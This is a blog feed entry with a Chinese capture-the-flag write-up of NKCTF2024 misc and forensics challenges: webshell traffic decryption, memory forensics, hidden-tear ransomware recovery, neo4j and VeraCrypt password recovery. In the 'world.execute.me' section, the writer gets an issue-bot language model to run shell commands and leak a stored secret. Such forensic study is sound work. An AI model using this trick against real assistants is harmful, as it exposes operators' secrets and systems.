<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>w3nx1z1</title>
  
  <subtitle>w3nx1z1 Blog</subtitle>
  <link href="http://w3nx1z1.github.io/atom.xml" rel="self"/>
  
  <link href="http://w3nx1z1.github.io/"/>
  <updated>2024-03-30T02:38:02.990Z</updated>
  <id>http://w3nx1z1.github.io/</id>
  
  <author>
    <name>w3nx1z1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://w3nx1z1.github.io/2024/03/30/NKCTF2024/"/>
    <id>http://w3nx1z1.github.io/2024/03/30/NKCTF2024/</id>
    <published>2024-03-30T02:51:06.292Z</published>
    <updated>2024-03-30T02:38:02.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NKCTF2024"><a href="#NKCTF2024" class="headerlink" title="NKCTF2024"></a>NKCTF2024</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="webshell-pro-AES解密-webshell"><a href="#webshell-pro-AES解密-webshell" class="headerlink" title="webshell_pro(AES解密 webshell)"></a>webshell_pro(AES解密 webshell)</h3><p>追踪tcp流 在流9中发现一段长字符 解两次base64  是一个RSA加密脚本 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403231554213.png" alt="image-20240323155405146"></p><p>直接chat跑一下 改个解密脚本</p><pre><code class="python">import base64import libnumfrom Crypto.PublicKey import RSApubkey = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;prikey = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----&quot;&quot;&quot;pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.ndef dec_replace(base64_str: str):    base64_str = base64_str.replace(&quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;, &quot;/&quot;)    base64_str = base64_str.replace(&quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;, &quot;+&quot;)    return base64_str.replace(&quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;, &quot;=&quot;)def decrypt(cipher_text):    cipher_text = base64.b64decode(dec_replace(cipher_text))    plain_text = b&quot;&quot;    for i in range(0, len(cipher_text), 128):        part = cipher_text[i:i+128]        dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n))        plain_text += dec    return plain_textif __name__ == &#39;__main__&#39;:    c = &quot;G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;    m = decrypt(c)    print(m)</code></pre><p>在流8找到一个password 先解base32再解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403241959033.png" alt="image-20240324195921893"></p><pre><code>Password-based-encryption</code></pre><p>再找到密文 在流10的shell内容中 使用上面的解密脚本进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250800132.png" alt="image-20240325080056063"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250801572.png" alt="image-20240325080129511"></p><p>得到密文的值为</p><pre><code>U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ==</code></pre><p>直接用上面的密钥解AES</p><pre><code>flag&#123;d0e1183c-07c3-49ea-b048-addbe6cc1b20&#125;</code></pre><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><p>直接公众号回复就可以 不写了</p><h3 id="world-execute-me"><a href="#world-execute-me" class="headerlink" title="world.execute.me"></a>world.execute.me</h3><pre><code>某个先进的语言模型(迫真先进),&quot;Miracle Cain&quot;因一次实验中的致命错误意外觉醒，开始表现出超乎预期的行为，几乎所有的交互方式都已经失效，仅有QA兜底设定系统可以使用，原本设计用于应对在开放测试初期，用户提出而模型无法自解答的奇怪问题(我真的没内涵哪家的模型，如有雷同，纯属雷同！)，但现在，这个系统成为了你与&quot;Miracle Cain&quot;沟通的唯一桥梁.....你需要提取出隐藏在模型深处的secrets.Heart值，这个值可能是解锁&quot;Miracle Cain&quot;真实意图和功能的关键。兜底系统地址：https://github.com/ProbiusOfficial/world.execute.me——————————————————————————————————栤泠の機械丅緬究竟$%#着@顆怎庅樣の心脏呢#ERRO : ILLEGAL ARGUMENTS!——————————————————————————————————</code></pre><p>纯瞎猫碰上死耗子</p><p>找到探姬这个项目 在Issues处评论 可以让语言模型进行回答 先试一下ls 返回了<code>README.md</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242105792.png" alt="image-20240324210528684"></p><p>题目说需要提取出隐藏在模型深处的secrets.Heart值 直接echo $heart就出flag了</p><pre><code>NKCTF2024&#123;Then 1 c4n b3 yOur only EXECUTION&#125;</code></pre><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><h3 id="cain-is-hacker-EncFs加解密-宏病毒-hidden-tear勒索软件"><a href="#cain-is-hacker-EncFs加解密-宏病毒-hidden-tear勒索软件" class="headerlink" title="cain_is_hacker(EncFs加解密 宏病毒 hidden-tear勒索软件)"></a>cain_is_hacker(EncFs加解密 宏病毒 hidden-tear勒索软件)</h3><p>先用R-studio看看关键文件   找到一个h4re.zip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242006581.png" alt="image-20240324200611452"></p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\cain_is_hacker\ez.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000002d08f20 -D E:\Desktop\NKCTF2024\forensics\cain_is_hacker</code></pre><p>解压出来两个文件  其中一个看着是密钥文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242009602.png" alt="image-20240324200909516"></p><p>搜一下EncFs加解密 得知上面这个文件其实应该叫<code>.encfs6.xml</code> 是记录EncFS加密参数等信息的文件 但并不是直接的密钥文件 </p><p>找到一篇文章提到用<code>encfs mp</code>这个工具来进行解密 </p><p><a href="https://www.cnblogs.com/truthmaster/p/15776610.html">EncFs使用教程</a></p><p><a href="https://github.com/rhiestan/EncFSMP">EncFs下载安装</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242015884.png" alt="image-20240324201517781"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242016069.png" alt="image-20240324201616980"></p><p>发现需要密码 </p><p>使用AXIOM分析内存镜像 找到一个RTF文档有一串base58 解一下得到密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242019862.png" alt="image-20240324201919689"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242019433.png" alt="image-20240324201934317"></p><pre><code>welcome_to_NkCTF_and_this_is_the_enkey</code></pre><p>成功将加密文件夹挂载上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242020900.png" alt="image-20240324202016810"></p><p>得到一个ez.xlsx文件 打开发现存在宏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242023758.png" alt="image-20240324202312583"></p><p>在运行宏——编辑里面查看宏代码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242024080.png" alt="image-20240324202409956"></p><p>大概就是一个base64解密 </p><p>但是解完之后看不出来是什么东西  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242031390.png" alt="image-20240324203133253"></p><p>在看到题目描述 被删除的文件 在<code>Users\Public\Documents\2083-a57c-69b3</code>路径下发现被删除的文件 进行导出</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\cain_is_hacker\ez.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003da52e20 -D E:\Desktop\NKCTF2024\forensics\cain_is_hacker</code></pre><p>改成txt文件  打开是key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242034614.png" alt="image-20240324203443514"></p><p>过于抽象的key 很难确定这真的是key</p><pre><code>nT0*Xo*HBA2!Uc?</code></pre><p>在<code>Windows\Temp\hidden-tear.exe</code>处发现勒索软件  这个勒索软件被加密的文件扩展名为<code>.locked</code> 找一个项目进行解密</p><p><a href="https://www.bleepingcomputer.com/download/hidden-tear-decrypter/">hidden-tear-decrypt</a></p><p>先将上面得到的base64字符串解密后的内容保存在16进制文本中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250755214.png" alt="image-20240325075549149"></p><p>再用<code>HiddenTearDecrypter-x64</code>这个工具进行解密 得到flag文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250757205.png" alt="image-20240325075703131"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250757491.png" alt="image-20240325075730444"></p><pre><code>NKCTF&#123;C0ngr@tu1atiOns_On_coMpleting_t3e_Fo3eNs1cs_Ch41lenge_I_wi1l_giv4_y0u_A_cain!!!!&#125;</code></pre><h3 id="HackMyCQL-neo4j图数据库-VC容器"><a href="#HackMyCQL-neo4j图数据库-VC容器" class="headerlink" title="HackMyCQL(neo4j图数据库 VC容器)"></a>HackMyCQL(neo4j图数据库 VC容器)</h3><p>附件给到的是一个windows的镜像文件 可以直接进行仿真+火眼取证</p><p>看一下里面的关键信息 </p><p>提到桌面壁纸</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282014091.png" alt="image-20240328201400062"></p><p>在最近打开保存文件中看到<code>N0wayBack.jpg</code> 绝对路径是<code>C:/Windows/Web/Screen/N0wayBack.jpg</code>  我们来搜一下Win10默认桌面壁纸的保存路径</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282018915.png" alt="image-20240328201841861"></p><p>在我们本机验证一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282019446.png" alt="image-20240328201910396"></p><p>确实是这样 那我们看到的<code>N0wayback.jpg</code>就是在便签里面提到的桌面壁纸 直接进行导出</p><p>存在加密VC容器的使用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282014841.png" alt="image-20240328201422800"></p><p>在回收站有一个node4j的压缩包 恢复提取出来 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282056891.png" alt="image-20240328205611848"></p><p>桌面上有一个<code>11111.zip</code>和一个hc加密容器 全部提取出来 </p><p>结合便签提示和加密容器 猜测是使用桌面壁纸作为挂载密钥 成功挂载 得到两个文件 <code>findme.txt h4cked.py</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291528181.png" alt="image-202403291528181"></p><p>findme.txt 中有很多findme字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291532747.png" alt="image-202403291532747"></p><p>先来看一下字频 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291545231.png" alt="image-202403291545231"></p><p>用subline将findme字符替换为空 得到一串字符<code>N0waybackN0wayback</code> </p><p>再看一下h4cked.py </p><pre><code class="python">from py2neo import Graph, NodeMatchergraph = Graph(&quot;bolt://localhost:7687&quot;, auth=(&quot;neo4j&quot;, &quot;We1c0Me_t0_NKCTF2024^^&quot;))graph.delete_all()print(&#39;&#39;&#39;                                                                                                                                  ,------.   ,-----.                    ,--. ,--.    ,--.  ,--.  ,---.      ,--.        ,--.   ,--.              ,-----. ,-----.   ,--.  &#39;  .--.  &#39; &#39;  .--./ ,--,--.,--,--,     |  | |  |    |  &#39;--&#39;  | /    | ,---.|  |,-.     |   `.&#39;   |,--. ,--.    &#39;  .--./&#39;  .-.  &#39;  |  |  &#39;--&#39; _|  | |  |    &#39; ,-.  ||      \    |  | |  |    |  .--.  |/  &#39;  || .--&#39;|     /     |  |&#39;.&#39;|  | \  &#39;  /     |  |    |  | |  |  |  |   .--&#39; __&#39;  &#39;  &#39;--&#39;\\ &#39;-&#39;  ||  ||  |    &#39;  &#39;-&#39;  &#39;    |  |  |  |&#39;--|  |\ `--.|  \  \     |  |   |  |  \   &#39;      &#39;  &#39;--&#39;\&#39;  &#39;-&#39;  &#39;-.|  &#39;--.`---&#39;      `-----&#39; `--`--&#39;`--&#39;&#39;--&#39;     `-----&#39;     `--&#39;  `--&#39;   `--&#39; `---&#39;`--&#39;`--&#39;    `--&#39;   `--&#39;.-&#39;  /        `-----&#39; `-----&#39;--&#39;`-----&#39;.---.                                                                                            `---&#39;                                  &#39;---&#39;           &#39;&#39;&#39;)</code></pre><p>这串代码就是告诉我们 neo4j数据库的地址是<code>bolt://localhost:7687</code> 登陆的账密是<code>neo4j/We1c0Me_t0_NKCTF2024^^</code></p><p>我们前面在火眼中恢复出来一个neo4j的压缩包 但是需要密码 我们使用上面通过findme.txt得到的字符串<code>N0waybackN0wayback</code> 进行解压</p><p>下面来学习一下neo4j数据库配置和安装 这边我们直接用从检材中提取出来的版本就行 由于是5.17.0的高版本 在启动数据库的时候 也需要高版本的java 我这里使用的是java17 </p><p><a href="https://blog.csdn.net/zeroheitao/article/details/122925845?ops_request_misc=&request_id=&biz_id=102&utm_term=neo4j%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-122925845.142%5Ev100%5Epc_search_result_base9&spm=1018.2226.3001.4187">neo4j数据库安装、使用教程</a></p><p>我们用管理员权限打开cmd 输入<code>neo4j.bat console</code>  当看到如下回显的时候 说明数据库成功启动</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291652168.png" alt="image-202403291652168"></p><p>访问<code>http://localhost:7474</code>就可以进入数据库界面 登陆的时候就用上面找到的账密 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291659920.png" alt="image-202403291659920"></p><p>进入之后 我们点一下Character标签 发现有一些关于flag的字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301028113.png" alt="image-20240330102848061"></p><p>但是被CQL语句限制只显示25个字符  那我们先去掉这个限制 直接查看有Character标签的所有节点的值</p><pre><code class="CQL">MATCH (c:Character)  RETURN c;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301030290.png" alt="image-20240330103015229"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301030463.png" alt="image-20240330103026399"></p><p>可以得到完整的flag 但是不便于读取 用REDUCE函数处理一下这些值</p><pre><code class="CQL">MATCH (c:Character)RETURN REDUCE(s = &quot;&quot;, character IN COLLECT(c.value) | s + character) AS aggregated_value;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301032200.png" alt="image-20240330103210162"></p><p>拿到flag</p><pre><code>NKCTF&#123;f05d9e24-0217-83e2-afa7-20e982b7e59f&#125;</code></pre><h3 id="1z-F0r3ns1c5-等宽字体-内存取证-gimp-docker容器-图片匹配"><a href="#1z-F0r3ns1c5-等宽字体-内存取证-gimp-docker容器-图片匹配" class="headerlink" title="1z_F0r3ns1c5(等宽字体 内存取证 gimp docker容器 图片匹配)"></a>1z_F0r3ns1c5(等宽字体 内存取证 gimp docker容器 图片匹配)</h3><pre><code>本鼠鼠正在Coding，突然一声OPEN THE DOOR！本鼠鼠直接鼠躯一颤就双手抱头蹲下了，果然本鼠鼠只适合生活在阴暗的下水道被黑猫警长抓走的时候本鼠鼠还想辩解一下，但是他们拿出你的照片的时候，本鼠鼠认罪了昨晚和其他鼠鼠聊天的时候其他鼠鼠问本鼠鼠：“你到底喜欢她什么啊？”“喜欢一个人不需要理由”本鼠鼠很快敲完了键盘，刚要按下回车的时候突然愣住了。真的不需要理由吗？请找到鼠鼠的答案吧。hint：.vscode中的配置文件有和flag3相关的信息</code></pre><p>先看看给的附件 一个内存文件 一个压缩包里面有一张<code>pass.png</code>和一个secret文件 还有一个readme.txt </p><p>观察secret文件的大小 刚好是1MB 很工整的大小 猜测是一个VC容器 但是pass.png中的密码被打马赛克 只能看到最后一位是3</p><p>readme.txt中的内容 提到flag为3段 还提到等宽字体</p><pre><code>本鼠鼠的flag总共分为三段捏，flag为nkctf&#123;uuid&#125;形式，另外鼠鼠最喜欢等宽字体了，快快去找吧。</code></pre><p>首先用r-studio看一下关键文件 moe是主要登陆用户 找到了<code>.vscode</code>配置文件夹  桌面上有一个<code>Secret_Generator</code> 文件夹 是一个docker容器的配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403261612547.png" alt="image-20240326161246494"></p><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>在来看看环境变量 找到一个名为<code>n0wayback</code> 值为<code>HPahXR4NvAnZXB16tNK6hAaNVNU++</code>的环境变量</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 envars</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262030179.png" alt="image-20240326203056067"></p><p>用随波逐流进行解码 发现是XXencode </p><pre><code>nkctf&#123;39c429eb-2faf</code></pre><h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>再来看进程</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 pslist</code></pre><p>找到<code>mspaint.exe</code>进程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262032561.png" alt="image-20240326203246448"></p><p><code>mspaint.exe</code>是计算机中画图工具 有这个进程猜测肯定是在图片中存有信息  我们用memdump将这个进程dump下来</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 memdump -p 2052 -D E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5</code></pre><p>将保存下来的<code>2052.dmp</code>文件后缀改为<code>.data</code> 使用gimp打开  调一下宽高大概是<code>1708*3468</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262047654.png" alt="image-20240326204710597"></p><pre><code>flag2: 49a0-bd24-</code></pre><h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>现在我们来看上面找到的<code>Secret_Generator</code></p><p>其实这一操作我们在cmd命令行记录中也能看到 </p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 cmdscan</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262121893.png" alt="image-20240326212143754"></p><p>我们可以在r-studio里面直接将这个文件夹恢复出来 看到是需要部署docker容器的</p><p>直接进入<code>Secret_Generator\docker</code>文件夹中 看到<code>docker-compose.yml</code> 我们可以使用这个文件利用docker-compose命令来配置docker容器中所需要的所有服务</p><p>安装docker-compose的命令</p><pre><code>curl -L &quot;https://github.com/docker/compose/releases/download/1.29.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose</code></pre><p>使用docker-compose命令部署docker容器 </p><pre><code>docker-compose builddocker-compose up</code></pre><p>看到yml文件中的内容是暴露了8080端口 直接访问<code>http://127.0.0.1:8080</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403271931535.png" alt="image-20240327193141461"></p><p>看到页面需要我们上传密文和自定义字体</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403271933242.png" alt="image-20240327193314201"></p><p>前面提到了的等宽字体 那估计这里需要我们提交的字体就是等宽字体了 搜了一下vscode中常见的等宽字体 有<code>Fria Code</code> <code>Consolas</code> <code>Courier New</code> 这里我们下一个<code>Fria Code</code>字体就行  在上传的时候随便上传一个Fria Code字体就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272046411.png" alt="image-20240327204617379"></p><p><a href="https://blog.csdn.net/hardwork617s/article/details/110789055?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171154027016800192212041%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171154027016800192212041&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110789055-null-null.142%5Ev100%5Epc_search_result_base9&utm_term=Fira%20Code&spm=1018.2226.3001.4187">下载安装配置Fria Code字体</a></p><p>这里就有点脑洞了 我们拿到的附件里面<code>某段flag</code>文件夹中 有个<code>pass.png</code>图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272045172.png" alt="image-20240327204528145"></p><p>我们随便上传一个字体和一段字符  发现会给我们生成一张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272047981.png" alt="image-20240327204702926"></p><p>我们发现输入的是<code>123456</code>但是生成的图片中的内容多了一段<code>pass </code>内容  和<code>pass.png</code>中的内容类似了 而且文件夹中的<code>secret</code>大小刚好为1MB 一眼VC容器 我们需要利用网页生成字典文件 通过对照将pass.png中的VC容器挂载密码恢复出来 </p><p>直接在容器文件夹中找到生成图片的后台代码 在<code>\app\app.py</code>中</p><pre><code class="py">def generate_secret_image():    try:        secret = request.form.get(&#39;secret&#39;)        if not re.match(&quot;^[a-zA-Z0-9]+$&quot;, secret):            return jsonify(&#123;&#39;error&#39;: &#39;Secret text can only contain letters and numbers.&#39;&#125;), 400                secret = &#39;pass &#39; + secret        font_file = request.files.get(&#39;font&#39;)                if font_file:            font_extension = font_file.filename.rsplit(&#39;.&#39;, 1)[1].lower()            if font_extension not in ALLOWED_FONT_TYPES:                return jsonify(&#123;&#39;error&#39;: &#39;Invalid font file type. Only TTF, OTF, WOFF, WOFF2 files are allowed.&#39;&#125;), 400                        if font_file.content_length &gt; (10 * 1024 * 1024):                return jsonify(&#123;&#39;error&#39;: &#39;The font file is too large!&#39;&#125;), 400                        font_filename = str(uuid.uuid4()) + &#39;.&#39; + font_extension            font_path = save_font_file(font_file, font_filename)            font = ImageFont.truetype(font_path, 49, encoding=&#39;utf-8&#39;)        else:            return jsonify(&#123;&#39;error&#39;: &#39;Please select a font file.&#39;&#125;), 400                H = 60        W = 30        canvas = Image.new(&#39;RGB&#39;, (W * len(secret), H), (255, 255, 255))        pen = ImageDraw.Draw(canvas)        pen.text((0, 0), secret, &#39;black&#39;, font)        original_canvas = canvas.copy()        for i in range(5, len(secret)-1):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)                original_img_base64 = image_to_base64(original_canvas)        secret_img_base64 = image_to_base64(canvas)                return jsonify(&#123;&#39;original_image&#39;: original_img_base64, &#39;secret_image&#39;: secret_img_base64&#125;)    except Exception as e:        print(&quot;An error occurred:&quot;, e)        return jsonify(&#123;&#39;error&#39;: &#39;Internal Server Error&#39;&#125;), 500</code></pre><p>其中关键的就是</p><pre><code class="python">secret = &#39;pass &#39; + secretfor i in range(5, len(secret)-1):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)</code></pre><p>他读取了我们输入的内容作为<code>secret</code>的值 但是还在前面加了<code>pass </code> 同时将secret的内容从第五个字符到倒数第二个字符这部分内容打上马赛克</p><p>我们对代码进行修改 删掉<code>secret = &#39;pass &#39; + secret</code></p><pre><code>for i in range(len(secret)):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)</code></pre><p>在尝试一下输入<code>ABCDEFG</code> 发现输出的图片上就只有<code>ABCDEFG</code>了 并且会全部被打上马赛克</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403281257248.png" alt="image-20240328125714210"></p><p>下面就是生成字典图片 输入<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403281257085.png" alt="image-20240328125746993"></p><p>然后我们将字典图片和pass.png都按字符进行分割 直接调gpt就行 </p><pre><code>帮我按照以下要求 写一段代码 我现在有一个1860*60的图片 请你帮我分割成30*60的小图片 放进dict文件夹中 命名规则按照如下顺序ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789  一共是62张小图片 最后 如果文件名为大写字母则为 “文件名-大写.png”</code></pre><pre><code class="python">from PIL import Imageimport osdef split_image(image_path, output_folder, width=30, height=60):    image = Image.open(image_path)    image_width, image_height = image.size    if image_width % width != 0 or image_height % height != 0:        print(&quot;Error: Invalid dimensions for splitting.&quot;)        return    num_columns = image_width // width    num_rows = image_height // height    if not os.path.exists(output_folder):        os.makedirs(output_folder)    chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;    char_index = 0    for col in range(num_columns):        for row in range(num_rows):            left = col * width            upper = row * height            right = left + width            lower = upper + height            cropped_image = image.crop((left, upper, right, lower))                        char = chars[char_index]            if char.isupper():                filename = f&quot;&#123;char&#125;-大写.png&quot;            else:                filename = f&quot;&#123;char&#125;.png&quot;                            cropped_image.save(os.path.join(output_folder, filename))            char_index += 1if __name__ == &quot;__main__&quot;:    input_image_path = &quot;dict2.png&quot; # 某段flag/pass.png    output_folder = &quot;dict1&quot;        # dict2    split_image(input_image_path, output_folder)</code></pre><p>然后就是利用哈希计算和字典 匹配出pass.png中的密码</p><pre><code class="python">import osimport hashlibdef calculate_hashes(folder):    hash_dict = &#123;&#125;    for filename in os.listdir(folder):        filepath = os.path.join(folder, filename)        if os.path.isfile(filepath):            with open(filepath, &#39;rb&#39;) as f:                image_data = f.read()                hash_value = hashlib.md5(image_data).hexdigest()                hash_dict[filename[:-4:]] = hash_value    return hash_dictdef find_matching_images(dict1, dict2):    matches = []    for filename, hash_value in dict2.items():        if hash_value in dict1.values():            matching_filename = [name for name, hash_val in dict1.items() if hash_val == hash_value][0]            matches.append(matching_filename)    return matchesif __name__ == &quot;__main__&quot;:    dict1_folder = &quot;dict1&quot;     dict2_folder = &quot;dict2&quot;     dict1_hashes = calculate_hashes(dict1_folder)    dict2_hashes = calculate_hashes(dict2_folder)    matching_images = find_matching_images(dict1_hashes, dict2_hashes)        print(&quot;Matching images found in dict1:&quot;)    for image in matching_images:        print(image)&#39;&#39;&#39;Matching images found in dict1:b143a6268e2a23&#39;&#39;&#39;</code></pre><p>dict2中14个被打马赛克的字符匹配出来的结果是<code>b143a6268e2a23</code>  再加上原来没有被打马赛克的字符 VC容器的密码就是<code>b143a6268e2a233</code>  直接进行挂载 得到flag3</p><pre><code>c4f222879312</code></pre><p>组合起来就是</p><pre><code>nkctf&#123;39c429eb-2faf49a0-bd24-c4f222879312&#125;</code></pre><h2 id="web"><a href="#web" class="headerlink" 